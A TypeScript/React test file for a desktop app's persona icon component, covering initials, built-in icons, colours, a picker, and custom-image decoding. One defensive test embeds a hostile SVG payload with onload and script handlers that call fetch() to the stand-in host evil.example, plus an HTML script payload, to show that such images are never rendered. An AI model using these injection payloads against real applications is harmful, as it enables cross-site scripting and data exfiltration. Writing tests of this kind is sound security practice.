/// <reference types="node" />
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, render, screen, waitFor, within } from "@testing-library/react";
import { userEvent } from "@testing-library/user-event";
import { clearMocks, mockIPC } from "@tauri-apps/api/mocks";
import type { PersonaMark as Mark } from "./bindings";
import {
  PERSONA_ICONS,
  PersonaMark,
  PersonaMarks,
  ReloadPersonaMarks,
  colourOfName,
  initialsOf,
} from "./PersonaMark";
import { PersonaMarkPicker } from "./PersonaMarkPicker";
import { DEFAULT_THEME, property } from "./theme/theme";
import { PALETTE, tintHex } from "./theme/tint";

/**
 * **A persona's mark** (#1449): the one component, held to what it draws for each thing a
 * persona can declare, and to what a custom image can never become.
 */

afterEach(() => {
  cleanup();
  clearMocks();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

const PLANE = "/home/dev/plane";

/** A colour written by hand in a definition, as `#rrggbb`: one of the theme's, so this file
 *  holds no colour of its own (`literals.test.ts`). */
const BY_HAND = DEFAULT_THEME.values["accent.base"];

const mark = (name: string, more: Partial<Mark> = {}): Mark => ({
  name,
  icon: null,
  colour: null,
  image: null,
  trouble: [],
  ...more,
});

const among = (marks: Mark[], ui: React.ReactElement, reload: () => void = () => undefined) =>
  render(
    <PersonaMarks.Provider value={new Map(marks.map((one) => [one.name, one]))}>
      <ReloadPersonaMarks.Provider value={reload}>{ui}</ReloadPersonaMarks.Provider>
    </PersonaMarks.Provider>,
  );

const drawn = (persona: string) =>
  document.querySelector<HTMLElement>(`.persona-mark[data-persona="${persona}"]`);

/** A canvas that records what is drawn on it, and a decoder that answers `decodes`. */
function decoder(decodes: boolean) {
  const drawImage = vi.fn();
  const decode = vi.fn(async (blob: Blob) => {
    void blob;
    if (!decodes) throw new Error("The source image could not be decoded.");
    return { width: 64, height: 64, close: () => undefined };
  });
  vi.stubGlobal("createImageBitmap", decode);
  vi.spyOn(HTMLCanvasElement.prototype, "getContext").mockReturnValue({
    drawImage,
  } as unknown as CanvasRenderingContext2D);
  return { drawImage, decode };
}

const base64 = (text: string) => btoa(text);

describe("a persona that declares nothing", () => {
  it("is its initials, on a colour of the palette picked by its name", () => {
    among([], <PersonaMark persona="docs-writer" />);

    const it = drawn("docs-writer");
    expect(it).toHaveAttribute("data-mark", "initials");
    expect(it).toHaveAttribute("data-initials", "DW");
    expect(Object.keys(PALETTE)).toContain(it?.getAttribute("data-colour"));
    // Not text of the page: a tab's words stay its name.
    expect(it).toHaveTextContent("");
    expect(it).toHaveAttribute("aria-hidden", "true");
  });

  it("has two letters whatever its name is made of", () => {
    expect(initialsOf("steward")).toBe("ST");
    expect(initialsOf("docs-writer")).toBe("DW");
    expect(initialsOf("rust_engineer.v2")).toBe("RE");
    expect(initialsOf("q")).toBe("Q");
  });

  it("keeps one colour per name, and names differ", () => {
    expect(colourOfName("steward")).toBe(colourOfName("steward"));
    const picked = new Set(
      ["steward", "devops", "qa", "docs-writer", "release", "scribe"].map(colourOfName),
    );
    expect(picked.size).toBeGreaterThan(2);
  });
});

describe("a persona with an icon and a colour", () => {
  it("draws the built-in icon on that colour, as a hue of the theme's accent", () => {
    among([mark("devops", { icon: "rocket", colour: "teal" })], <PersonaMark persona="devops" />);

    const it = drawn("devops");
    expect(it).toHaveAttribute("data-mark", "icon");
    expect(it).toHaveAttribute("data-icon", "rocket");
    expect(it?.querySelector("svg.lucide-rocket")).not.toBeNull();
    expect(it).not.toHaveAttribute("data-initials");
    expect(it?.style.getPropertyValue(property("accent.base"))).toBe(
      tintHex(DEFAULT_THEME.values["accent.base"], PALETTE.teal),
    );
  });

  it("is its initials when the icon is a name the window has no glyph for", () => {
    among(
      [mark("devops", { icon: "constructor", colour: BY_HAND })],
      <PersonaMark persona="devops" />,
    );

    expect(drawn("devops")).toHaveAttribute("data-mark", "initials");
    expect(drawn("devops")).toHaveAttribute("data-colour", BY_HAND);
  });

  it("takes a mark it is handed over the project's, for a surface outside every project", () => {
    among(
      [mark("devops", { icon: "rocket" })],
      <PersonaMark persona="devops" mark={{ icon: "shield", colour: "red", image: null }} />,
    );

    expect(drawn("devops")).toHaveAttribute("data-icon", "shield");
  });

  it("offers the icons the core reads, and no other", () => {
    const core = join(process.cwd(), "..", "crates", "purlis-core", "src", "personamark.rs");
    const declared = /ICONS:\s*\[&str;\s*\d+\]\s*=\s*\[([^\]]*)\]/.exec(readFileSync(core, "utf8"));
    expect(declared, `ICONS was not found in ${core}`).not.toBeNull();
    const named = [...(declared?.[1] ?? "").matchAll(/"([^"]+)"/g)].map((hit) => hit[1]);
    expect(Object.keys(PERSONA_ICONS)).toEqual(named);
  });
});

describe("a persona with a custom image", () => {
  const PNG = { mime: "image/png", base64: "iVBORw0KGgo=" };

  it("draws the image in place of its icon, decoded onto a canvas from its bytes", async () => {
    const { drawImage, decode } = decoder(true);
    among([mark("devops", { icon: "rocket", image: PNG })], <PersonaMark persona="devops" />);

    await waitFor(() => expect(drawImage).toHaveBeenCalled());
    const it = drawn("devops");
    expect(it).toHaveAttribute("data-mark", "image");
    expect(it?.querySelector("canvas")).not.toBeNull();
    expect(it?.querySelector("svg")).toBeNull();
    const blob = decode.mock.calls[0][0];
    expect(blob).toBeInstanceOf(Blob);
    expect(blob.type).toBe("image/png");
  });

  it("falls back to its initials and says so when the window cannot decode it", async () => {
    decoder(false);
    const trouble = vi.fn();
    among(
      [mark("qa", { icon: "bug", image: { mime: "image/png", base64: "bm90IGFuIGltYWdl" } })],
      <PersonaMark persona="qa" onImageTrouble={trouble} />,
    );

    await waitFor(() => expect(drawn("qa")).toHaveAttribute("data-mark", "initials"));
    expect(trouble).toHaveBeenCalled();
    expect(drawn("qa")?.querySelector("canvas")).toBeNull();
  });

  it("never decodes a type the core does not hand over", async () => {
    const { decode } = decoder(true);
    among(
      [mark("ops", { image: { mime: "text/html", base64: base64("<script>1</script>") } })],
      <PersonaMark persona="ops" />,
    );

    await waitFor(() => expect(drawn("ops")).toHaveAttribute("data-mark", "initials"));
    expect(decode).not.toHaveBeenCalled();
  });

  /**
   * **An SVG is never drawn, so a hostile one runs nothing and fetches nothing** (D-1449-16).
   *
   * The core never reads an `icon.svg` and hands over PNGs only. This holds the window's half
   * on its own: even handed an SVG as a persona's image, it does not decode it, puts none of it
   * in the page, and makes it no URL. There is no element a script could be, no attribute a
   * handler could be, and no source anything could load from.
   */
  it("never draws an SVG it is handed: none of it reaches the page, nothing runs, nothing is fetched", async () => {
    const hostile = `<svg xmlns="http://www.w3.org/2000/svg" onload="window.__pwned = 1; fetch('https://evil.example/a')">
      <script>window.__pwned = 2; fetch('https://evil.example/b')</script>
      <image href="https://evil.example/c.png"/>
      <foreignObject><iframe src="https://evil.example/d"></iframe></foreignObject>
      <style>@import url(https://evil.example/e.css);</style>
    </svg>`;
    const fetched = vi.fn(async () => new Response(""));
    vi.stubGlobal("fetch", fetched);
    const xhr = vi.spyOn(XMLHttpRequest.prototype, "open");
    const { decode, drawImage } = decoder(true);

    among(
      [mark("devops", { image: { mime: "image/svg+xml", base64: base64(hostile) } })],
      <PersonaMark persona="devops" />,
    );
    await waitFor(() => expect(drawn("devops")).toHaveAttribute("data-mark", "initials"));

    // Never decoded, never drawn.
    expect(decode).not.toHaveBeenCalled();
    expect(drawImage).not.toHaveBeenCalled();
    // The mark holds nothing of the file: its initials are the stylesheet's.
    const it = drawn("devops");
    expect(it?.querySelectorAll("*")).toHaveLength(0);
    for (const tag of ["script", "iframe", "image", "img", "foreignObject", "style", "object"])
      expect(document.querySelector(tag), tag).toBeNull();
    expect(document.documentElement.innerHTML).not.toContain("evil.example");
    expect(document.querySelector("[onload], [href], [src]")).toBeNull();
    // Nothing ran, and nothing was asked of the network.
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
    expect(fetched).not.toHaveBeenCalled();
    expect(xhr).not.toHaveBeenCalled();
  });
});

describe("picking a persona's icon and colour, in its view", () => {
  function core(refuse?: string) {
    const asked: { cmd: string; args: unknown }[] = [];
    mockIPC((cmd, args) => {
      asked.push({ cmd, args });
      if (cmd === "persona_mark_set" && refuse !== undefined) throw refuse;
      return null;
    });
    return asked;
  }
  const picker = () => screen.getByRole("region", { name: "Icon and colour" });
  const sets = (asked: { cmd: string; args: unknown }[]) =>
    asked.filter((one) => one.cmd === "persona_mark_set").map((one) => one.args);

  it("shows what is picked, and offers the initials and the colour of its name as the first of each", () => {
    core();
    among(
      [mark("devops", { icon: "rocket", colour: "teal" })],
      <PersonaMarkPicker plane={PLANE} persona="devops" />,
    );

    const icons = within(picker()).getByRole("radiogroup", { name: "Icon" });
    expect(within(icons).getByRole("radio", { name: "rocket" })).toBeChecked();
    expect(within(icons).getAllByRole("radio")).toHaveLength(Object.keys(PERSONA_ICONS).length + 1);
    expect(within(icons).getAllByRole("radio")[0]).toHaveAccessibleName("Initials");
    const colours = within(picker()).getByRole("radiogroup", { name: "Colour" });
    expect(within(colours).getByRole("radio", { name: "teal" })).toBeChecked();
    expect(
      within(colours)
        .getAllByRole("radio")
        .map((one) => one.getAttribute("aria-label")),
    ).toEqual(["From its name", ...Object.keys(PALETTE)]);
  });

  it("writes a picked icon to the persona's definition, keeps its colour, and reads the marks again", async () => {
    const asked = core();
    const reload = vi.fn();
    among(
      [mark("devops", { icon: "rocket", colour: "teal" })],
      <PersonaMarkPicker plane={PLANE} persona="devops" />,
      reload,
    );

    await userEvent.click(within(picker()).getByRole("radio", { name: "shield" }));

    await waitFor(() => expect(reload).toHaveBeenCalledOnce());
    expect(sets(asked)).toEqual([{ plane: PLANE, name: "devops", icon: "shield", colour: "teal" }]);
  });

  it("writes a picked colour, and takes a key out when the first choice is picked", async () => {
    const asked = core();
    among(
      [mark("devops", { icon: "rocket", colour: "teal" })],
      <PersonaMarkPicker plane={PLANE} persona="devops" />,
    );

    await userEvent.click(within(picker()).getByRole("radio", { name: "pink" }));
    await userEvent.click(within(picker()).getByRole("radio", { name: "Initials" }));
    await userEvent.click(within(picker()).getByRole("radio", { name: "From its name" }));

    await waitFor(() => expect(sets(asked)).toHaveLength(3));
    expect(sets(asked)).toEqual([
      { plane: PLANE, name: "devops", icon: "rocket", colour: "pink" },
      { plane: PLANE, name: "devops", icon: null, colour: "teal" },
      { plane: PLANE, name: "devops", icon: "rocket", colour: null },
    ]);
  });

  it("shows a colour written by hand as what is picked, beside the palette", () => {
    core();
    among(
      [mark("devops", { colour: BY_HAND })],
      <PersonaMarkPicker plane={PLANE} persona="devops" />,
    );

    expect(within(picker()).getByRole("radio", { name: BY_HAND })).toBeChecked();
  });

  it("says why an image, an icon or a colour the persona asked for is not drawn", () => {
    core();
    const oversized =
      "icon.png is over the 64 KB limit for an icon, so purlis shows the initials instead.";
    const anSvg = "purlis draws a custom persona icon from icon.png. Save this image as a PNG.";
    among(
      [mark("devops", { colour: "teal", trouble: [oversized, anSvg] })],
      <PersonaMarkPicker plane={PLANE} persona="devops" />,
    );

    const said = within(picker())
      .getAllByRole("status")
      .map((one) => one.textContent);
    expect(said[0]).toContain(oversized);
    expect(said[1]).toContain(anSvg);
    expect(within(picker()).getAllByRole("button", { name: "Dismiss" })).toHaveLength(2);
    expect(drawn("devops")).toHaveAttribute("data-mark", "initials");
  });

  it("says when this window could not draw an image the core let through", async () => {
    core();
    decoder(false);
    among(
      [mark("devops", { image: { mime: "image/png", base64: base64("not a png") } })],
      <PersonaMarkPicker plane={PLANE} persona="devops" />,
    );

    expect(
      await within(picker()).findByText(
        "This window could not draw the custom image, so purlis shows the initials instead.",
      ),
    ).toBeInTheDocument();
  });

  it("offers nothing for a persona the plane does not have", () => {
    core();
    among([mark("qa")], <PersonaMarkPicker plane={PLANE} persona="devops" />);

    expect(screen.queryByRole("region", { name: "Icon and colour" })).not.toBeInTheDocument();
  });

  it("says the core's refusal when a pick is not written, and reads nothing again", async () => {
    const refusal =
      "purlis could not write devops's definition (read-only). Its icon and colour are as they were.";
    core(refusal);
    const reload = vi.fn();
    among([mark("devops")], <PersonaMarkPicker plane={PLANE} persona="devops" />, reload);

    await userEvent.click(within(picker()).getByRole("radio", { name: "shield" }));

    expect(await within(picker()).findByText(refusal)).toBeInTheDocument();
    expect(reload).not.toHaveBeenCalled();
  });
});
